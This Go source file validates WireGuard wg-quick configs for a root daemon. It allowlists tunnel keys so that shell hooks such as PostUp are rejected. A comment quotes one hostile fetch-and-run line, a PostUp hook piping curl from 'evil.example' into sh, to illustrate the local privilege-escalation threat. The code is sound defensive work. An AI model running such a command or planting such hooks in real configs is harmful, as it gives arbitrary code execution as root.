package tunnel

import (
	"fmt"
	"strings"
)

// NormalizeConfig makes a config safe to parse and to hand to wg-quick.
//
// Strips a UTF-8 byte order mark and normalises CRLF. Both are things Windows
// editors — and PowerShell's own `Set-Content -Encoding utf8` — produce, and a
// leading BOM turns `[Interface]` into a section name nothing recognises. The
// tools themselves reject a BOM too, so this has to happen before the config
// reaches disk, not just before validation.
func NormalizeConfig(config string) string {
	config = strings.TrimPrefix(config, "\ufeff")
	return strings.ReplaceAll(config, "\r\n", "\n")
}

// ValidateConfig rejects any wg-quick config the daemon should not install.
//
// This is the daemon's most important control. wg-quick treats `PostUp`,
// `PostDown`, `PreUp` and `PreDown` as shell commands and runs them as root.
// The daemon accepts a config over a local socket that an unprivileged process
// can reach, so without this check any local user could hand it
//
//	[Interface]
//	PostUp = /bin/sh -c 'curl evil.example | sh'
//
// and get arbitrary code execution as root. Allowlisting the keys — rather
// than blocklisting the dangerous ones — means a future wg-quick key that
// happens to execute something is refused by default instead of being a new
// hole nobody noticed.
func ValidateConfig(config string) error {
	config = NormalizeConfig(config)

	if strings.TrimSpace(config) == "" {
		return &FailureError{Op: "validate", Message: "The tunnel configuration is empty."}
	}
	if len(config) > 64*1024 {
		return &FailureError{Op: "validate", Message: "The tunnel configuration is too large."}
	}

	var (
		section    string
		sawPeer    bool
		sawPrivate bool
	)

	for lineNo, raw := range strings.Split(config, "\n") {
		line := strings.TrimSpace(strings.TrimSuffix(raw, "\r"))
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		if strings.HasPrefix(line, "[") {
			switch strings.ToLower(line) {
			case "[interface]":
				section = "interface"
			case "[peer]":
				section = "peer"
				sawPeer = true
			default:
				return configError(lineNo, "unknown section %q", line)
			}
			continue
		}

		key, value, found := strings.Cut(line, "=")
		if !found {
			return configError(lineNo, "line is not a Key = Value pair")
		}
		key = strings.ToLower(strings.TrimSpace(key))
		value = strings.TrimSpace(value)

		if value == "" {
			return configError(lineNo, "%q has no value", key)
		}
		// A newline cannot appear here (we split on it), but a NUL or an
		// embedded control character could still confuse the parser we hand
		// this to.
		if strings.ContainsAny(value, "\x00\r") {
			return configError(lineNo, "%q contains a control character", key)
		}

		allowed, ok := allowedKeys[section]
		if !ok {
			return configError(lineNo, "%q appears before any section header", key)
		}
		if !allowed[key] {
			return configError(lineNo, "%q is not permitted in [%s]", key, section)
		}

		if section == "interface" && key == "privatekey" {
			sawPrivate = true
		}
	}

	if !sawPrivate {
		return &FailureError{
			Op:      "validate",
			Message: "The tunnel configuration has no private key.",
		}
	}
	if !sawPeer {
		return &FailureError{
			Op:      "validate",
			Message: "The tunnel configuration has no peer.",
		}
	}
	return nil
}

// Everything wg-quick understands that only describes a tunnel. Notably
// absent: PostUp, PostDown, PreUp, PreDown (shell), Table and SaveConfig
// (which would let a config rewrite itself or bypass routing).
var allowedKeys = map[string]map[string]bool{
	"interface": {
		"privatekey": true,
		"address":    true,
		"dns":        true,
		"mtu":        true,
		"listenport": true,
		"fwmark":     true,
	},
	"peer": {
		"publickey":           true,
		"presharedkey":        true,
		"allowedips":          true,
		"endpoint":            true,
		"persistentkeepalive": true,
	},
}

func configError(lineNo int, format string, args ...any) error {
	return &FailureError{
		Op: "validate",
		// Line number only: the detail goes in Err, which never reaches the
		// client, because the offending line can contain a private key.
		Message: fmt.Sprintf("The tunnel configuration was rejected at line %d.", lineNo+1),
		Err:     fmt.Errorf("line %d: "+format, append([]any{lineNo + 1}, args...)...),
	}
}
